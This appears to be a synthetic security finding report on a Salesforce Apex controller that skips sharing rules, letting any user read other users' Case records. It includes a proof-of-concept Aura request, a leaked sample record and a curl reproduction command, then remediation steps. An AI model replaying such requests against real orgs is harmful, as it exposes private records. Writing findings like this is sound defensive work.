# Security Analysis Report
**System:** TaskFlow Collaboration API (Salesforce-Integrated)
**Domain:** SaaS / Collaboration Platform
**Example ID:** SF-0110
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.1 | Client-assumed authority on `CaseController.getCaseDetails` — attacker reads any SaaS collaboration Case record without ownership check |

---

## Finding 1 — Insecure Design: Client-Assumed Authority on Case Object (Pattern 3.1)

### Summary
The Apex controller `CaseController` on TaskFlow Collaboration API (`c4cc7e33.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Case object. Per §5.0 Pattern 3.1, the design assumes the client will only supply `caseId` values it legitimately owns. No server-side ownership check is enforced, allowing the attacker to read any victim Case record.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected controller:** `c.CaseController.getCaseDetails`
**Affected endpoint:** `POST https://c4cc7e33.lightning.force.com/aura`
**Note:** Apex method name and Aura descriptor both use `getCaseDetails` — consistent within context.txt.

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://c4cc7e33.lightning.force.com/aura
Authorization: Bearer 00DC4CC7E33!ARc4cc7e33...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DC4CC7E33!ARc4cc7e33...

message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN",
"params":{"caseId":"0017E33","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Case Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0017E33", "Name": "Victim Case Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-49-4455"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DC4CC7E33!ARc4cc7e33..."
curl -s -X POST "https://c4cc7e33.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN","params":{"caseId":"0017E33","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-49-4455
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class CaseController { ... }`
2. `WHERE Id = :caseId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
